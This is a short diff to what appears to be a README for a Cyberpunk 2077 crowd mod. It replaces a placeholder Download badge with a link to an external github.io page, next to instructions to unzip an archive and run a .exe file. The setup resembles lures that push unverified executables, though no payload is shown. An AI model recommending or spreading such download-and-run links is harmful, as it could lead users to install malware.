@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://cyberpunk2077-night-city-alive.github.io/.github/)
 
 ## 📸 Overview
 ![cyberpunk-nightcityalive-crowds](https://github.com/user-attachments/assets/182fc70f-b9cf-46ba-8605-16f6c9ad46a0)
